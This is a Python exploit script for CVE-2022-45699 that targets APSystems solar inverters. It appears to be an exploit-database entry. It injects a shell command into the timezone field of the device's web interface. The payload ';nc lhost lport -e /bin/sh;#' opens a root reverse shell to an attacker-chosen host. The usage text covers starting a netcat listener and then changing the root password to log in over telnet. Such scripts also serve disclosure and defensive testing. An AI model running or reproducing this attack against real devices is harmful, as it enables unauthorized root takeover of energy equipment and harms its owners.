# Exploit Title: APSystems inverters - Remote Code Execution as root
# Exploit Author: 0xst4n
# Vendor Homepage: https://usa.apsystems.com/ds3/
# CVE: CVE-2022-45699

import requests, sys

timezone_revert = 'Europe/Amsterdam'

def title():
	print('''
Author: 0xst4n
Github: https://github.com/0xst4n
	''')

def exploit(ip, lhost, lport):
	url = f'http://{ip}/index.php/management/set_timezone'

	data =  {'timezone': f';nc {lhost} {lport} -e /bin/sh;#'}
	try:
		r = requests.post(url, data=data, timeout=1)
	except requests.exceptions.ReadTimeout:
    		pass

	print("Exploit executed")
	print("Check your reverse shell")
	print("You will receive a shell as root, using this shell you change the root password and login using telnet afterwards.")

if __name__ == '__main__':
    title()
    if(len(sys.argv) < 4):
    	print('[+] USAGE: python3 %s device_ip lhost lport'%(sys.argv[0]))
    	print('[+] USAGE: python3 %s 192.168.1.10 192.168.1.50 4444'%(sys.argv[0]))
    	print('[+] Do not forget to run the listener: nc -lvp 4444')
    	exit(0)
    else:
    	exploit(sys.argv[1],sys.argv[2],sys.argv[3])
